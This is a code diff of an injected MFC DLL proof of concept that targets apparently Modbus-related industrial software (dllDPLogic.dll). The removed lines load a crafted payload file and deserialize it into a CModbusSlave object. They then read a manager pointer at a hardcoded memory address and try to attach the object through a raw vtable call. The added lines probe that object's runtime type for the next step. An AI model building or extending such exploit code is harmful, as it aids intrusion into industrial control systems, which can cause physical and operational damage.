@@ -1,6 +1,7 @@
 #include <afx.h>
 #include <afxwin.h>
 #include <vector>
+#include <afxtempl.h>
 
 typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
 
@@ -12,77 +13,32 @@ extern "C" __declspec(dllexport) void RunPoc()
 {
     AFX_MANAGE_STATE(AfxGetStaticModuleState());
 
-    const TCHAR* kPayloadPath = _T("C:\\payload.bin");
-    CFile file;
-    if (!file.Open(kPayloadPath, CFile::modeRead | CFile::typeBinary)) {
-        ShowError(_T("Failed to open C:\\payload.bin"));
-        return;
-    }
-
-    ULONGLONG size = file.GetLength();
-    std::vector<BYTE> buffer((size_t)size);
-    file.Read(buffer.data(), (UINT)size);
-    file.Close();
-
-    CMemFile memFile(buffer.data(), (UINT)size);
-    CArchive ar(&memFile, CArchive::load);
-
-    HMODULE module = ::GetModuleHandle(_T("dllDPLogic.dll"));
-    if (!module) {
-        ShowError(_T("dllDPLogic.dll not loaded"));
-        return;
-    }
-
-    FARPROC proc = ::GetProcAddress(module, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
-    if (!proc) { ShowError(_T("Factory not found")); return; }
-
-    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
-    CRuntimeClass* runtimeClass = getClass();
-    CObject* obj = runtimeClass->CreateObject();
-
-    if (!obj) { ShowError(_T("CreateObject failed")); return; }
-
-    // 1. 反序列化验证
-    try {
-        obj->Serialize(ar);
-        ::MessageBox(NULL, _T("Serialize OK! Payload is Valid."), _T("Success"), MB_OK);
-    } catch (CException* e) {
-        e->Delete();
-        ShowError(_T("Serialize Failed"));
-        return;
-    }
-
-    // 2. 挂载到 TCP Manager
-    void* pManager = *(void**)0x0084713C;
-    if (!pManager) {
+    void* pManagerRaw = *(void**)0x0084713C;
+    if (!pManagerRaw) {
         ShowError(_T("Manager is NULL"));
         return;
     }
 
-    /*
-    try {
-        DWORD* vtable = *(DWORD**)pManager;
-        void* pAddFunc = (void*)vtable[25];
+    CObject* pManager = reinterpret_cast<CObject*>(pManagerRaw);
+    CString info;
+    info.Format(_T("Manager Addr: %p\n"), pManager);
 
-        int result = 0;
-        __asm {
-            push 1
-            push 0
-            push obj
-            mov ecx, pManager
-            call pAddFunc
-            mov result, eax
+    try {
+        CRuntimeClass* pClass = pManager->GetRuntimeClass();
+        if (pClass && pClass->m_lpszClassName) {
+            info.AppendFormat(_T("Class Name: %S\n"), pClass->m_lpszClassName);
+        } else {
+            info.Append(_T("Class Name: <null>\n"));
         }
 
-        ::MessageBox(NULL, _T("Attached with 3 Args! Check Tree!"), _T("Success"), MB_OK);
-        obj = nullptr;
-    } catch (...) {
-        ShowError(_T("Crash with 3 args."));
-    }
-    */
+        if (pManager->IsKindOf(RUNTIME_CLASS(CObList))) {
+            info.Append(_T("✅ YES! It IS a CObList!\nWe can use standard AddTail."));
+        } else {
+            info.Append(_T("❌ NO. It is NOT a CObList.\nWe need to find its base class."));
+        }
 
-    // POC 阶段只生不灭，避免析构潜在崩溃
-    obj = nullptr;
-    ar.Close();
-    memFile.Close();
+        ::MessageBox(NULL, info, _T("RTTI Analysis"), MB_OK);
+    } catch (...) {
+        ShowError(_T("Crash during RTTI check."));
+    }
 }
